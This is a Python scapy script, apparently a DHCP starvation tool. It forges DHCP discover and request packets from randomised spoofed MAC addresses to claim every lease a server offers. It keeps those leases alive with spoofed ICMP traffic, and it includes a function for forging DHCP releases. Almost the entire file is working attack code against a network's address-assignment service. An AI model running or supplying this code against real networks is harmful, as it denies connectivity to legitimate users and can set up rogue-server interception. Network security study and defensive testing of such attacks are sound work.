from scapy.all import *
import time
import binascii
import threading
import sys
from enum import Enum
import inspect
import random
import mac
from types import SimpleNamespace

IP_GLOBAL_BROADCAST='255.255.255.255'

args = SimpleNamespace()
args.debug=False
args.keep_alive=False
args.keep_alive_while_starving=False
class MESSAGETYPE:
    DISCOVER = 1
    OFFER = 2
    REQUEST = 3
    DECLINE = 4
    ACK = 5
    NACK = 6
    RELEASE = 7
    INFORM = 8

class DHCP_ATTS:
    MSGTYPE = MESSAGETYPE()

"""
TODO make mac templates
TODO verbose flag
TODO option to write pcap
TODO use python buit-in logger
TODO check keep alive while starving
"""


def random_transaction_id():
    """
    makes a random transaction ID
    transaction IDs are random numberes declared by the client
    for the server to be able to differentiate clients 
    """
    return random.randint(0, 0xFFFFFFFF)



def mac_to_binary(regular_mac : str):
    """
    gets a string, removes collons and turns it to binary representation
    you need to give BOOTP the binary representation of mac in scapy cuz who knows
    """
    regular_mac = regular_mac.replace(':', '')
    #BOOTP accepts raw mac for some reason
    return binascii.unhexlify(regular_mac)


def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, transaction_id : hex, interface : str = conf.iface):
    """
    sends a DHCP release with the source and dest being the args through the arg interface
    """
    function_name = inspect.currentframe().f_code.co_name


    dhcp_options= [('message-type','release'), ('server_id', server_ip),('end')]


    releaseMyIp = Ether(dst=server_mac, src=src_mac)\
                    / IP(dst=server_ip,src=ip,ttl=5)\
                    / UDP(dport=67,sport=68)\
                    / BOOTP(htype=1,op=1,chaddr=mac_to_binary(src_mac), xid = transaction_id, ciaddr = ip)\
                    / DHCP(options=dhcp_options)
    
    if(args.debug):
        print(f"{function_name} : sending dhcp release from {ip},{src_mac} to {server_ip},{server_mac} via {interface}")
        
    sendp(releaseMyIp, iface=interface)

def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : str, interface : str = conf.iface):
    """
    sends a DHCP request with the source being the args through the arg interface
    """
    function_name = inspect.currentframe().f_code.co_name
    dhcp_options= [('message-type','request'), ('client_id', device_mac), ('requested_addr', ip),('server_id', server_ip),('end')]
    
    request_packet = Ether(dst=ETHER_BROADCAST, src=device_mac, type=ETHER_TYPES.IPv4)\
                    / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=5)\
                    / UDP(dport=67,sport=68)\
                    / BOOTP(htype=1,op=1,chaddr=mac_to_binary(device_mac), hops = 2, xid = transaction_id)\
                    / DHCP(options=dhcp_options)
    if(args.debug):
        print(f"{function_name} : sending dhcp request for {ip} to {server_ip}, via {interface}")
    sendp(request_packet, iface=interface)

def dhcp_discover(src_mac : str, interface : str = conf.iface):
    """
    sends a DHCP discover with the source being the args through the arg interface
    """
    
    dhcp_options = [('message-type', 'discover'), ('client_id', src_mac), ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),('end')]
    discover_packet = Ether(dst = ETHER_BROADCAST, src=src_mac, type=ETHER_TYPES.IPv4)\
                        / IP(dst=IP_GLOBAL_BROADCAST, src='0.0.0.0')\
                        / UDP(dport=67,sport=68)\
                        / BOOTP(htype=1,op=1,chaddr=mac_to_binary(src_mac), xid = random_transaction_id(), ciaddr = '0.0.0.0')\
                        / DHCP(options=dhcp_options)
    sendp(discover_packet, iface=interface)   

def is_bootp(packet)->bool:
    """
    checks if theres bootp
    no other checking
    """
    function_name = inspect.currentframe().f_code.co_name

    if(BOOTP not in packet):
        if(args.debug):
            print(f"{function_name} : packet not BOOTP [{packet}]")
        return False

    return True

def is_dhcp(packet)->bool:
    """
    checks if theres bootp and dhcp
    """
    function_name = inspect.currentframe().f_code.co_name

    if(is_bootp(packet) == False):
        return False

    if(DHCP not in packet):
        if(args.debug):
            print(f"{function_name} : packet not DHCP [{packet}]")
        return False

    return True

def is_my_dhcp_offer(packet, my_mac : str)->bool:
    
    function_name = inspect.currentframe().f_code.co_name
    
    # to binary
    my_mac = mac_to_binary(my_mac)

    #there is both bootp and dhcp
    if is_dhcp_offer(packet) == False:
        return False
    
    return my_mac in packet[BOOTP].chaddr
        

def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str = conf.iface , result_list = None):
    """
    Gets a MAC and server IP
    tries to Capture DHCP responses for the provided MAC
    """
    function_name = inspect.currentframe().f_code.co_name

    if (args.debug):
        print(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
    
    res = sniff(count=1, filter = f"udp and ether src {server_mac}", timeout=4, iface=interface,\
            lfilter= lambda packet : is_my_dhcp_offer(packet, dest_mac))

    if len(res) != 0:
        result_list[0] = res[0]

    if (args.debug ):
        if len(res) != 0 : print(f"{function_name} : captured {res}")
        else : print(f"{function_name} : returning None")
    
    return None
    

def is_dhcp_ack(packet)->bool:
    
    if(is_bootp_reply(packet) == False):
        return False
    if(is_dhcp(packet) == False):
        return False

    return is_dhcp_msg_type_eq(packet, DHCP_ATTS.MSGTYPE.ACK)

def is_dhcp_offer( packet )->bool:
    """
    return is_bootp_reply(packet) and
        is_dhcp_msg_type_eq(packet, DHCP_ATTS.MSGTYPE.OFFER) 
    """

    return is_bootp_reply(packet) and\
        is_dhcp_msg_type_eq(packet, DHCP_ATTS.MSGTYPE.OFFER) 

def is_dhcp_msg_type_eq(packet, value : int )->bool:
    """
    Doesnt check if packet is dhcp the caller must do it 
    Returns true if message type field of dhcp pdu is equal to value
    """  
    function_name = inspect.currentframe().f_code.co_name

    message_type_index = find_dhcp_option('message-type', packet[DHCP])

    #there is no message-type option in dhcp packet
    if message_type_index == -1 : 
        if(args.debug):
            print(f"{function_name} : no message-type in [{packet}]")
        return False

    if(args.debug):
            print(f"{function_name} : message-type in {message_type_index}th index of {packet}")

    return packet[DHCP].options[message_type_index][1] == value 

def is_for_my_mac(mac : str, packet):
    function_name = inspect.currentframe().f_code.co_name
    
    if(args.debug):
            print(f"{function_name} : {packet} is destined for {packet[Ether].dst} and provided mac is {mac}")
    return packet[Ether].dst == mac

def find_dhcp_option(option : str, dhcp_pdu : scapy.layers.dhcp.DHCP):
    """
    Doesnt check is pdu is dhcp
    Gets a DHCP PDU and a MAC
    Returns -1 if the DHCP PDU doesn't include the option
    """
    function_name = inspect.currentframe().f_code.co_name

    for i in range (0,len(dhcp_pdu.options)): 
        if dhcp_pdu.options[i][0] == option : return i
    
    if(args.debug):
            print(f"{function_name} : {dhcp_pdu} doen't contain {option}")
    return -1

def is_bootp_reply(packet)->bool:
    """
    False if is_bootp() is False or is not a BOOTPREPLY
    """
    function_name = inspect.currentframe().f_code.co_name

    if(is_bootp(packet) == False):
        return False

    #is a BOOTPREPLY
    if(args.debug):
            print(f"{function_name} : {packet} packet[BOOTP].op == 2 is {packet[BOOTP].op == 2}")
    return packet[BOOTP].op == 2



def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,ips_to_starve : int = 5)->List[Tuple[str, str, str]]:
    """
    TODO check if dhcp request if acked
    TODO option to keep alive ip's while starving
    TODO warn about NAKs
    starves ips at the given interface and returns a list of (ip, mac, interface) that are occupied in
    this starvation session
    """


    function_name = inspect.currentframe().f_code.co_name
    
    occupied_ips: List[Tuple[str, str]] = []
    is_acked : bool = True

    if(args.debug):
        print(f"{function_name} : starving {ips_to_starve} IPs from {server_ip} , {server_mac}")

    i = 0
    
    time_to_wait = 1

    while (len(occupied_ips) < ips_to_starve):
        
        time.sleep(time_to_wait)
        
        keep_alive_thread = threading.Thread(target=keep_ips_alive_icmp, args=[occupied_ips, server_ip, server_mac], name='sniff for offer')
        if((args.keep_alive_while_starving) and (len(occupied_ips) != 0)):
            print(f"{function_name} : keeping alive while starving")
            keep_alive_thread.start()

        print(f"{function_name} : attempt {i} captured {len(occupied_ips)} IP's time_to_wait {time_to_wait}")
        i += 1

        mac_template = mac.macs[random.randint(0,len(mac.macs) - 1)][1]
        print(mac_template)
        temp_mac = str(RandMAC(mac_template))

        offer = [None]
        
        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface ,offer], name='sniff for offer')
        sniff_thread.start()
        
        time.sleep(0.2)
        dhcp_discover(temp_mac, interface)
        
        sniff_thread.join()
        
        if(offer[0] is None):
            print('no offer captured')
            time_to_wait += 1
            continue
        
        offered_ip = offer[0][BOOTP].yiaddr
        
        if args.debug:
            print(offered_ip + ',' + temp_mac)
        


        dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip, interface)
        
        if(is_acked):
            occupied_ips.append((offered_ip, temp_mac, interface))
        
        
        keep_alive_thread._stop()

        time_to_wait -= 1
    return occupied_ips


def sendp_icmp(src_ip : str, src_mac : str, dst_ip : str, dst_mac : str, interface : str = conf.iface):
    
    function_name = inspect.currentframe().f_code.co_name
    
    packet = Ether(dst = dst_mac, src = src_mac , type=ETHER_TYPES.IPv4)\
            / IP(src = src_ip, dst = dst_ip)\
            / ICMP()
    if(args.debug):
        print(f"{function_name} : sending {packet} to {dst_ip},{dst_mac} via {interface}")
    
    sendp(packet, iface=interface)

def keep_ips_alive_icmp(devices : List[Tuple[str,str]], dhcp_server_ip : str, dhcp_server_mac : str):
    function_name = inspect.currentframe().f_code.co_name
    if(args.debug):
        print(f"{function_name} : keeping alive these ips : {devices}")
    
    i = 5
    while(True):
        time.sleep(2)
        for device in devices:
            sendp_icmp(dst_ip=dhcp_server_ip, dst_mac=dhcp_server_mac,src_ip=device[0], src_mac=device[1], interface=device[2])




